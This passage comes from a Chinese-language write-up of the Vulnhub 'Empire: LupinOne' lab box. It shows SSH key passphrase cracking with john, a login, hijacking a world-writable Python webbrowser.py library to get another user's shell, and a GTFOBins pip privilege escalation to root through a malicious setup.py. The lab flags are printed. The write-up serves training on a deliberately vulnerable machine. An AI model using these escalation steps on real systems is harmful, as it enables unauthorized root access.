class=\"hljs-built_in\">any</span> other key <span class=\"hljs-keyword\">for</span> status\nP@55w0rd!        (prikey)     \n1g <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:04 DONE (<span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-05 <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">40</span>) <span class=\"hljs-number\">0.2100</span>g/s <span class=\"hljs-number\">26.89</span>p/s <span class=\"hljs-number\">26.89</span>c/s <span class=\"hljs-number\">26.89</span>C/s Autumn2013..change\nUse the <span class=\"hljs-string\">\"--show\"</span> option to display <span class=\"hljs-built_in\">all</span> of the cracked passwords reliably\nSession completed. \n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>使用<code>ssh</code>指定私钥进行登录，密码使用刚刚破解出来的<code>P@55w0rd!</code> ,用户是<code>icex64</code></p>\n<pre><code class=\"hljs language-python\">ssh -i prikey icex64@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.182</span>\n</code></pre>\n<pre><code class=\"hljs language-python\">Enter passphrase <span class=\"hljs-keyword\">for</span> key <span class=\"hljs-string\">'prikey'</span>: \nLinux LupinOne <span class=\"hljs-number\">5.10</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">8</span>-amd64 <span class=\"hljs-comment\">#1 SMP Debian 5.10.46-5 (2021-09-23) x86_64</span>\n<span class=\"hljs-comment\">########################################</span>\nWelcome to Empire: Lupin One\n<span class=\"hljs-comment\">########################################</span>\nLast login: Thu Oct  <span class=\"hljs-number\">7</span> 05:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">43</span> <span class=\"hljs-number\">2021</span> <span class=\"hljs-keyword\">from</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.26</span><span class=\"hljs-number\">.4</span>\nicex64@LupinOne:~$ \n</code></pre>\n<p>获得<code>shell</code></p>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">icex64@LupinOne:~$ whoami\nicex64\nicex64@LupinOne:~$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">1001</span>(icex64) gid=<span class=\"hljs-number\">1001</span>(icex64) groups=<span class=\"hljs-number\">1001</span>(icex64)\nicex64@LupinOne:~$ uname -a\nLinux LupinOne <span class=\"hljs-number\">5.10</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">8</span>-amd64 <span class=\"hljs-comment\">#1 SMP Debian 5.10.46-5 (2021-09-23) x86_64 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p>寻找利用点</p>\n<ul>\n<li>\n<p><code>sudo -l</code> ，存在一个允许<code>arsene</code>的权限执行<code>py</code>脚本</p>\n<pre><code class=\"hljs language-python\">icex64@LupinOne:~$ sudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> icex64 on LupinOne:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\n\nUser icex64 may run the following commands on LupinOne:\n    (arsene) NOPASSWD: /usr/<span class=\"hljs-built_in\">bin</span>/python3<span class=\"hljs-number\">.9</span> /home/arsene/heist.py\n</code></pre>\n</li>\n<li>\n<p>当前目录下存在<code>user.txt</code>文件</p>\n<pre><code class=\"hljs language-python\">    ...,    ,...    ..,.   .,,  *&#x26;@@@@@@@@@@&#x26;/.    ,,,.   .,..    ...,    ...,  \n    ,,,.    .,,,    *&#x26;@@%%%%%%%%%%%%%%%%%%%%%%%%%%%&#x26;@,.   ..,,    ,,,,    ,,,.  \n..,.    ,..,  (@&#x26;<span class=\"hljs-comment\">#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&#x26;%,.    ..,,    ,...    ..</span>\n    .... .@&#x26;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@  ....    ....    ,...  \n    .,<span class=\"hljs-comment\">#@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@  .,..    ,.,.    ...,  </span>\n.,,,&#x26;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@<span class=\"hljs-comment\">#@.,    .,.,    .,..    .,</span>\n...@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&#x26;@<span class=\"hljs-comment\">####@*.    ..,,    ....    ,.</span>\n<span class=\"hljs-meta\">   @%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@%</span><span class=\"hljs-comment\">#######@% .,.,    .,.,    .,.,  </span>\n..,,@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@%<span class=\"hljs-comment\">#######@@,    ..,.    ,..,    ..</span>\n.,,, @@@@@@@@&#x26;%%%%%%%%%%%%%&#x26;@@@@@@@@@@@@@@@@@@@%%%<span class=\"hljs-comment\">#####@@,    .,,,    ,,.,    .,</span>\n    ..@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%<span class=\"hljs-comment\">###@@ .,..    ...,    ....  </span>\n...,  .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%<span class=\"hljs-comment\">#&#x26;@.    ...,    ...,    ..</span>\n....   <span class=\"hljs-comment\">#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%@.    ....    ....    ..</span>\n    .,.,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#x26;%%%%%%%<span class=\"hljs-comment\">#@*.,.,    .,.,    ..@@@@</span>\n..,.    .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%<span class=\"hljs-comment\">#@@    ..,.    ,..*@&#x26;&#x26;@@.</span>\n.,,.    ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%@@    .,,.    .@&#x26;&#x26;&#x26;@( ,,\n    ,.,.  .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#x26;%%%%%%%@@%%&#x26;@@@, ,,,@&#x26;@@@.,,,  \n....    ...<span class=\"hljs-comment\">#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#x26;&#x26;%%%%&#x26;%,@%%%%%%%#@@@@@%..    ..</span>\n...,    ...,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#x26;&#x26;&#x26;&#x26;@,*,,@%%%%%%@@@&#x26;@%%@..    ..\n    ,,.,    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/,***,*,@%%%@@&#x26;@@@%%<span class=\"hljs-comment\">###@ ,,.,  </span>\n    .,. @@&#x26;&#x26;&#x26;@@,,/@@@@@@@@@@@@@@@@@@@@@@@@<span class=\"hljs-comment\">#,,,,,,,,,*,,@%%%@&#x26;&#x26;@@%%%%%##&#x26;* ,...  </span>\n.,,, @@&#x26;@@&#x26;@&#x26;@@%,*,*,*,*,***,*,*,***,*,*,*,*,*,*,**,&#x26;@%%&#x26;@@@&#x26;@%%%%%%%%@/.,    .,\n  /@@&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;@@*,,,,,,,,,,,,,,,,,,,,,,*,,,**,%@&#x26;%%%%@&#x26;&#x26;&#x26;@%%%%%%%%%@(    ,..,  \n<span class=\"hljs-meta\"> @&#x26;@&#x26;@&#x26;@&#x26;@&#x26;@&#x26;@&#x26;&#x26;@@@@@(<span class=\"hljs-params\">,*,*,,**,*,*,,,*<span class=\"hljs-comment\">#&#x26;@@&#x26;%%%%%%%%&#x26;@@@@@%%%%%%%%@&#x26;..,    .,.,  </span>\n@@@&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;@@@&#x26;&#x26;&#x26;@@@@&#x26;&#x26;@@&#x26;&#x26;@&#x26;&#x26;&#x26;%&#x26;%%%%%%%@&#x26;&#x26;&#x26;@&#x26;%%%%%%&#x26;@,..    ...,    ..\n @&#x26;&#x26;&#x26;@&#x26;@&#x26;@&#x26;@&#x26;@&#x26;@&#x26;@&#x26;@&#x26;@&#x26;@&#x26;@&#x26;@&#x26;&#x26;@@@&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;%&#x26;%%%%&#x26;@&#x26;&#x26;@@%%%<span class=\"hljs-comment\">#&#x26;@%..,    .,.,    .,.,  </span>\n  @@@@&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;@&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;%%&#x26;%@&#x26;@&#x26;@&#x26;@@%..   ....    ....    ,..,  \n.,,, *@@&#x26;&#x26;&#x26;@&#x26;@&#x26;@&#x26;@&#x26;@&#x26;@&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;%&#x26;&#x26;@@&#x26;&#x26;@....    ,.,    .,,,    ,,..    .,\n    ,,,,    .,%@@@@@@@@@@@@@@@@%,  ...,@@&#x26;&#x26;@(<span class=\"hljs-params\">,,    ,,,.   .,,,    ,,.,    .,,.  \n    .,.,    .,,,    .,,.   ..,.    ,*@@&#x26;&#x26;@ ,,,,    ,.,.   .,.,    .,.,    .,.,  \n...,    ....    ....    ,..    ,..@@@&#x26;@<span class=\"hljs-comment\">#,..    ....    ,..    ...,    ....    ..</span>\n    ....    ....    ...    ....@.,%&#x26;@..    ....    ...    ....    ....    ....  \n    ...,    ....    ....   .*/,...&#x26;.,,,    ....    ....   .,..    ...,    ...,  \n.,.,    .,.,    ,,.,    .,../*,,&#x26;,,    ,.,,    ,.,,    ..,    .,.,    .,.,    ,,\n\n3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}\n</span></span></span></code></pre>\n</li>\n<li>\n<p><code>/home/arsene</code> 下存在 <code>note.txt</code></p>\n<pre><code class=\"hljs language-python\">Hi my friend Icex64,\n\nCan you please <span class=\"hljs-built_in\">help</span> check <span class=\"hljs-keyword\">if</span> my code <span class=\"hljs-keyword\">is</span> secure to run, I need to use <span class=\"hljs-keyword\">for</span> my <span class=\"hljs-built_in\">next</span> heist.\n\nI dont want to anyone <span class=\"hljs-keyword\">else</span> get inside it, because it can compromise my account <span class=\"hljs-keyword\">and</span> find my secret file.\n\nOnly you have access to my program, because I know that your account <span class=\"hljs-keyword\">is</span> secure.\n\nSee you on the other side.\n\nArsene Lupin.\n\n</code></pre>\n<p>提到<code>arsene</code> 下存在秘密文件，并且它的代码就是我们可以<code>sudo</code>运行的</p>\n</li>\n</ul>\n</li>\n<li>\n<p>查看<code>heist.py</code>文件</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">import</span> webbrowser\n\n<span class=\"hljs-built_in\">print</span> (<span class=\"hljs-string\">\"Its not yet ready to get in action\"</span>)\n\nwebbrowser.<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"https://empirecybersecurity.co.mz\"</span>)\n</code></pre>\n<p>操作逻辑就是打开使用<code>print</code>函数输出一句话然后使用<code>webbrowser.open</code> 函数打开网址</p>\n<p>查看文件权限</p>\n<pre><code class=\"hljs language-python\">icex64@LupinOne:/home/arsene$ ls -al | grep heist.py \n-rw-r--r-- <span class=\"hljs-number\">1</span> arsene arsene  <span class=\"hljs-number\">118</span> Oct  <span class=\"hljs-number\">4</span>  <span class=\"hljs-number\">2021</span> heist.py\n</code></pre>\n<p>很可惜，知识只读的</p>\n</li>\n<li>\n<p>我们把注意力放在<code>webbrowser</code> 这个库中（<code>heist.py</code>中引入的库），因为文件里面调用了<code>webbrowser.open</code>函数</p>\n<ul>\n<li>\n<p>搜索<code>webbrowser</code> 文件，应该就是第一个</p>\n<pre><code class=\"hljs language-python\">icex64@LupinOne:/usr/share/python3$ find / -name *webbrowser* <span class=\"hljs-number\">2</span>>/dev/null\n/usr/lib/python3<span class=\"hljs-number\">.9</span>/webbrowser.py\n/usr/lib/python3<span class=\"hljs-number\">.9</span>/**pycache**/webbrowser.cpython-<span class=\"hljs-number\">39.</span>pyc\n</code></pre>\n</li>\n<li>\n<p>查看其权限，竟然是可编辑的，那就可以得到<code>arsene</code> 用户的<code>shell</code>了</p>\n<pre><code class=\"hljs language-python\">icex64@LupinOne:/usr/lib/python3<span class=\"hljs-number\">.9</span>$ ls -al | grep web\n-rwxrwxrwx  <span class=\"hljs-number\">1</span> root root  <span class=\"hljs-number\">24087</span> Oct  <span class=\"hljs-number\">4</span>  <span class=\"hljs-number\">2021</span> webbrowser.py\n</code></pre>\n</li>\n<li>\n<p>添加代码，直接调用<code>system</code> 函数</p>\n<p><img src=\"/post-images/VulnhubEmpire%20LupinOne/image63.png\" alt=\"image.png\"></p>\n</li>\n</ul>\n</li>\n<li>\n<p>保存退出，执行就能获得<code>arsene</code> 的<code>shell</code>了</p>\n<pre><code class=\"hljs language-python\">sudo -u arsene /usr/<span class=\"hljs-built_in\">bin</span>/python3<span class=\"hljs-number\">.9</span> /home/arsene/heist.py\n</code></pre>\n<p><img src=\"/post-images/VulnhubEmpire%20LupinOne/image64.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>查看<code>arsene</code> 的权限</p>\n<pre><code class=\"hljs language-python\">arsene@LupinOne:/usr/lib/python3<span class=\"hljs-number\">.9</span>$ sudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> arsene on LupinOne:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\n\nUser arsene may run the following commands on LupinOne:\n    (root) NOPASSWD: /usr/<span class=\"hljs-built_in\">bin</span>/pip\n</code></pre>\n<p><code>pip</code>可以使用<code>sudo</code>权限</p>\n</li>\n<li>\n<p><code>pip</code>提权</p>\n<p>链接：<a href=\"https://gtfobins.github.io/gtfobins/pip/\">https://gtfobins.github.io/gtfobins/pip/</a></p>\n<pre><code class=\"hljs language-python\">TF=$(mktemp -d)\necho <span class=\"hljs-string\">\"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &#x3C;$(tty) >$(tty) 2>$(tty)')\"</span> > $TF/setup.py\n</code></pre>\n<pre><code class=\"hljs language-python\">sudo pip install $TF\n</code></pre>\n<p>获得<code>root</code>权限！！！！</p>\n</li>\n<li>\n<p>读取<code>flag</code>文件</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># cat root.txt</span>\n*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(((((((((((((((((((((,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\n,                       .&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;(            /&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;                       \n,                    &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;*                          @&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;                   \n,                *&#x26;&#x26;&#x26;&#x26;&#x26;                                   &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;                \n,              &#x26;&#x26;&#x26;&#x26;&#x26;                                         &#x26;&#x26;&#x26;&#x26;&#x26;.             \n,            &#x26;&#x26;&#x26;&#x26;                   ./<span class=\"hljs-comment\">#%@@&#x26;#,                   &#x26;&#x26;&#x26;&#x26;*           </span>\n,          &#x26;%&#x26;&#x26;          &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;**,**/&#x26;&#x26;(&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;             &#x26;&#x26;&#x26;&#x26;          \n,        &#x26;@(&#x26;        &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;.....,&#x26;&#x26;*&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;             &#x26;&#x26;&#x26;&#x26;        \n,      .&#x26; &#x26;          &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;      &#x26;&#x26;.&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;               &#x26;%&#x26;       \n,     @&#x26; &#x26;           &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;      &#x26;&#x26; &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;                @&#x26;&#x26;&#x26;     \n,    &#x26;%((            &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;      &#x26;&#x26; &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;                 <span class=\"hljs-comment\">#&#x26;&#x26;&#x26;    </span>\n,   &#x26;<span class=\"hljs-comment\">#/*             &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;      &#x26;&#x26; #&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;(                 (&#x26;&#x26;&#x26;   </span>\n,  %@ &#x26;              &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;      &#x26;&#x26; ,&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;                  /*&#x26;/  \n,  &#x26; &#x26;               &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;      &#x26;&#x26;* &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;                   &#x26; &#x26;  \n, &#x26; &#x26;                &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;,     &#x26;&#x26;&#x26; &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;(                   &#x26;,@ \n,.&#x26; <span class=\"hljs-comment\">#                #&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;(     &#x26;&#x26;&#x26;.&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;                   &#x26; &#x26; </span>\n*&#x26; &#x26;                 ,&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;             &#x26;(&#x26;\n*&#x26; &#x26;                 ,&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;            &#x26; &#x26;\n*&#x26; *              &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;@.                 &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;             @ &#x26;\n*&#x26;              &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;@    &#x26;&#x26;&#x26;&#x26;&#x26;/          &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;                &#x26; &#x26;\n*% .           &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;@&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;   &#x26;  &#x26;&#x26;(  <span class=\"hljs-comment\">#&#x26;&#x26;&#x26;&#x26;   &#x26;&#x26;&#x26;&#x26;.                   % &#x26;</span>\n*&#x26; *            &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;   /*      @%&#x26;%&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;    &#x26;&#x26;&#x26;&#x26;,                   @ &#x26;\n*&#x26; &#x26;               &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;           &#x26; &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;     @&#x26;&#x26;&#x26;                   &#x26; &#x26;\n*&#x26; &#x26;                    &#x26;&#x26;&#x26;&#x26;&#x26;        /   /&#x26;&#x26;&#x26;&#x26;         &#x26;&#x26;&#x26;                   &#x26; @\n*/(,                      &#x26;&#x26;                            &#x26;                   / &#x26;.\n* &#x26; &#x26;                     &#x26;&#x26;&#x26;       <span class=\"hljs-comment\">#             &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;      @             &#x26; &#x26;.</span>\n* .% &#x26;                    &#x26;&#x26;&#x26;%&#x26;     &#x26;    @&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;.   %@&#x26;&#x26;*               ( @, \n/  &#x26; %                   .&#x26;&#x26;&#x26;&#x26;  &#x26;@ @                 &#x26;/                    @ &#x26;  \n*   &#x26; @                  &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;    &#x26;&#x26;.               ,                    &#x26; &#x26;   \n*    &#x26; &#x26;               &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26; &#x26;    &#x26;&#x26;&#x26;(          &#x26;                   &#x26; &#x26;    \n,     &#x26; %           &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;(       .&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;  &#x26;                  &#x26; &#x26;     \n,      &#x26; .. &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;*          &#x26;  &#x26;                &#x26; &#x26;      \n,       <span class=\"hljs-comment\">#&#x26; &#x26; &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;        &#x26;.             %  &#x26;       </span>\n,         &#x26;  , &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;.     &#x26;&#x26;&#x26;&#x26;          @ &#x26;*        \n,           &#x26; ,, &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;.  /&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;    &#x26; &#x26;@          \n,             &#x26;  &#x26; <span class=\"hljs-comment\">#&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;  &#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;@ &#x26;. &#x26;&#x26;            </span>\n,               &#x26;&#x26; /<span class=\"hljs-comment\"># /&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;# &#x26;&#x26;&#x26;# &#x26;# #&#x26;               </span>\n,                  &#x26;&#x26;  &#x26;( .&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;  &#x26;&#x26;  &#x26;&#x26;                  \n/                     ,&#x26;&#x26;(  &#x26;&#x26;%   *&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;&#x26;%   .&#x26;&#x26;&#x26;  /&#x26;&#x26;,                     \n,                           &#x26;&#x26;&#x26;&#x26;&#x26;/...         .<span class=\"hljs-comment\">#&#x26;&#x26;&#x26;&#x26;#                           </span>\n\n3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}\nSee you on the <span class=\"hljs-built_in\">next</span> heist.\n</code></pre>\n</li>\n</ol>\n<h2>总结</h2>\n<p>学到了<code>ssh</code>密钥可以转换成<code>john</code>可破解的格式然后破解密码（仅仅只是私钥的密码，而不是账号的密码），以及一些枚举知识，还有<code>pip</code>提权</p>","title":"Vulnhub - Empire LupinOne","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"Empire: LupinOne\n\n https://www.vulnhub.com/entry/empire-lupinone,750/\n \n\n描述：CTF like box. You have to enumerate as much as you can. 需要很多枚举\n\n端口扫描主机发现\n\n1. 探测存活主机，`182`是靶机\n    \n    \n    \n2. 探测主机所有开放端口，仅存..."},"recentPosts":[{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsB I G","title":"TheHackersLabs - B.I.G","date":"2025-07-18","isEncrypted":false,"year":"2025","month":"07","day":"18"},{"id":"TheHackersLabsBlackGold","title":"TheHackersLabs - BlackGold","date":"2025-07-15","isEncrypted":false,"year":"2025","month":"07","day":"15"},{"id":"TheHackersLabsSedition","title":"TheHackersLabs - Sedition","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"}]},"__N_SSG":true}